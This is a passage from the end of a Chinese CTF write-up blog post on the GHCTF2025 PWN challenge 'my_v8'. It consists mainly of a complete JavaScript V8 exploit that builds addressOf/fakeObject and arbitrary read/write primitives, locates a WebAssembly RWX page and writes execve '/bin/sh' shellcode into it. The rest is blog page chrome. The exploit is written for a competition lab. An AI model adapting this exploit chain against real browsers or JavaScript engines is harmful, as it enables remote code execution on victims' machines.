<li>这里就先附上<code>exp</code>：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">// ××××××××<span class="number">1.</span> 无符号<span class="number">64</span>位整数和<span class="number">64</span>位浮点数的转换代码×××××××</span><br><span class="line">var buf =new ArrayBuffer(<span class="number">16</span>);</span><br><span class="line">var float64 = new Float64Array(buf);</span><br><span class="line">var bigUint64 = new BigUint64Array(buf);</span><br><span class="line">// 浮点数转换为<span class="number">64</span>位无符号整数</span><br><span class="line">function f2i(f)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">// <span class="number">64</span>位无符号整数转为浮点数</span><br><span class="line">function i2f(i)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">// <span class="number">64</span>位无符号整数转为<span class="number">16</span>进制字节串</span><br><span class="line">function <span class="built_in">hex</span>(i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">// ××××××××<span class="number">2.</span> addressOf和fakeObject的实现××××××××</span><br><span class="line">var obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line">var obj_array = [obj];</span><br><span class="line">var float_array = [<span class="number">1.1</span>];</span><br><span class="line">var obj_array_map = obj_array.Myread();</span><br><span class="line">var float_array_map = float_array.Myread();</span><br><span class="line">// 泄露某个<span class="built_in">object</span>的地址</span><br><span class="line">function addressOf(obj_to_leak)</span><br><span class="line">&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.Mywrite(float_array_map);</span><br><span class="line">    let obj_addr = f2i(obj_array[<span class="number">0</span>]) - 1n;</span><br><span class="line">    obj_array.Mywrite(obj_array_map); // 还原array类型，以便后续继续使用</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line">// 将某个addr强制转换为<span class="built_in">object</span>对象</span><br><span class="line">function fakeObject(addr_to_fake)</span><br><span class="line">&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + 1n);</span><br><span class="line">    float_array.Mywrite(obj_array_map);</span><br><span class="line">    let faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.Mywrite(float_array_map); // 还原array类型，以便后续继续使用</span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line">var fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(0n),</span><br><span class="line">    i2f(0x41414141n),</span><br><span class="line">    i2f(0x1000000000n),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line">var fake_array_addr = addressOf(fake_array);</span><br><span class="line">var fake_object_addr = fake_array_addr - 0x40n + 0x10n;</span><br><span class="line">var fake_object = fakeObject(fake_object_addr);</span><br><span class="line">function read64(addr)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - 0x10n + 0x1n);</span><br><span class="line">    let leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    console.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +<span class="built_in">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="built_in">hex</span>(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line">function write64(addr, data)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - 0x10n + 0x1n);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    console.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +<span class="built_in">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="built_in">hex</span>(data));    </span><br><span class="line">&#125;</span><br><span class="line">var wasmCode = new Uint8Array([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">var f = wasmInstance.exports.main;</span><br><span class="line">var f_addr = addressOf(f);</span><br><span class="line">console.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + <span class="built_in">hex</span>(f_addr));</span><br><span class="line">var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;</span><br><span class="line">var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;</span><br><span class="line">var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;</span><br><span class="line">var rwx_page_addr = read64(wasm_instance_addr + 0x88n);</span><br><span class="line">console.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="built_in">hex</span>(rwx_page_addr));</span><br><span class="line">var shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line">var data_buf = new ArrayBuffer(<span class="number">24</span>);</span><br><span class="line">var data_view = new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), true);</span><br><span class="line">data_view.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), true);</span><br><span class="line">data_view.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), true);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://iyheart.github.io">iyheart</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://iyheart.github.io/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/">http://iyheart.github.io/2025/03/09/CTFblog/write up系列blog/2025年/GHCTF2025-PWN方向wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://iyheart.github.io" target="_blank">iyheart的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover157.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" target="_blank"><img class="post-qr-code-img" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/25/PWN%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E7%B4%A2%E5%BC%95/" title="PWN系列文章索引"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover166.png" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN系列文章索引</div></div></a></div><div class="next-post pull-right"><a href="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="流量分析基础"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover167.png" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">流量分析基础</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">iyheart</div><div class="author-info__description">悟已往之不谏，知来者之可追</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">139</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">40</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hello_world"><span class="toc-number">2.</span> <span class="toc-text">Hello_World</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#helloworld%E5%88%86%E6%9E%901"><span class="toc-number">2.1.</span> <span class="toc-text">HelloWorld分析1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#helloworld%E5%88%86%E6%9E%902"><span class="toc-number">2.2.</span> <span class="toc-text">HelloWorld分析2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hello_world_exp"><span class="toc-number">2.3.</span> <span class="toc-text">Hello_World_exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libc1"><span class="toc-number">3.</span> <span class="toc-text">ret2libc1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc1_%E5%88%86%E6%9E%901"><span class="toc-number">3.1.</span> <span class="toc-text">ret2libc1_分析1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc1_exp"><span class="toc-number">3.2.</span> <span class="toc-text">ret2libc1_exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libc2"><span class="toc-number">4.</span> <span class="toc-text">ret2libc2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc2_%E5%88%86%E6%9E%901"><span class="toc-number">4.1.</span> <span class="toc-text">ret2libc2_分析1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc2_%E5%88%86%E6%9E%902"><span class="toc-number">4.2.</span> <span class="toc-text">ret2libc2_分析2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc2_exp"><span class="toc-number">4.3.</span> <span class="toc-text">ret2libc2_exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E7%9C%9F%E4%BC%9A%E5%B8%83%E6%A0%88%E5%90%97"><span class="toc-number">5.</span> <span class="toc-text">你真会布栈吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E7%9C%9F%E4%BC%9A%E5%B8%83%E6%A0%88%E5%90%97_%E5%88%86%E6%9E%90"><span class="toc-number">5.1.</span> <span class="toc-text">你真会布栈吗？_分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E7%9C%9F%E4%BC%9A%E5%B8%83%E6%A0%88%E5%90%97%E6%80%9D%E8%B7%AF1_%E5%88%A9%E7%94%A8xchg-raxr13%E5%92%8C%E6%A0%88%E5%9C%B0%E5%9D%80"><span class="toc-number">5.2.</span> <span class="toc-text">你真会布栈吗？思路1_利用xchg rax,r13和栈地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E7%9C%9F%E4%BC%9A%E5%B8%83%E6%A0%88%E5%90%97%E6%80%9D%E8%B7%AF2_%E5%8F%AA%E5%88%A9%E7%94%A8xchg-raxr13"><span class="toc-number">5.3.</span> <span class="toc-text">你真会布栈吗？思路2_只利用xchg rax,r13</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#my_vm"><span class="toc-number">6.</span> <span class="toc-text">my_vm</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">6.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#myvm%E5%88%86%E6%9E%901"><span class="toc-number">6.2.</span> <span class="toc-text">myvm分析1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#my_vm%E5%88%86%E6%9E%902"><span class="toc-number">6.3.</span> <span class="toc-text">my_vm分析2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#my_vm_exp"><span class="toc-number">6.4.</span> <span class="toc-text">my_vm_exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fruit_ninja"><span class="toc-number">7.</span> <span class="toc-text">fruit_ninja</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">7.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">7.2.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fruitninja%E5%88%86%E6%9E%90"><span class="toc-number">7.3.</span> <span class="toc-text">fruitninja分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fruit_ninja_exp"><span class="toc-number">7.4.</span> <span class="toc-text">fruit_ninja_exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#my_v8"><span class="toc-number">8.</span> <span class="toc-text">my_v8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#my_v8_exp"><span class="toc-number">8.1.</span> <span class="toc-text">my_v8_exp</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86IO-FILE%E5%9F%BA%E7%A1%80/" title="PWN堆IO_FILE基础">PWN堆IO_FILE基础</a><time datetime="2025-03-28T14:28:15.000Z" title="发表于 2025-03-28 22:28:15">2025-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/" title="PWN堆house-of-roman">PWN堆house-of-roman</a><time datetime="2025-03-28T00:43:36.000Z" title="发表于 2025-03-28 08:43:36">2025-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/" title="PWN堆unsorted_bin_attack2">PWN堆unsorted_bin_attack2</a><time datetime="2025-03-26T01:25:04.000Z" title="发表于 2025-03-26 09:25:04">2025-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/" title="PWN堆house-of-atum">PWN堆house-of-atum</a><time datetime="2025-03-25T06:23:51.000Z" title="发表于 2025-03-25 14:23:51">2025-03-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/fastbin-attack/" title="fastbin_attack总结">fastbin_attack总结</a><time datetime="2025-03-25T00:49:30.000Z" title="发表于 2025-03-25 08:49:30">2025-03-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By iyheart</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script src="/zhheo/random.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>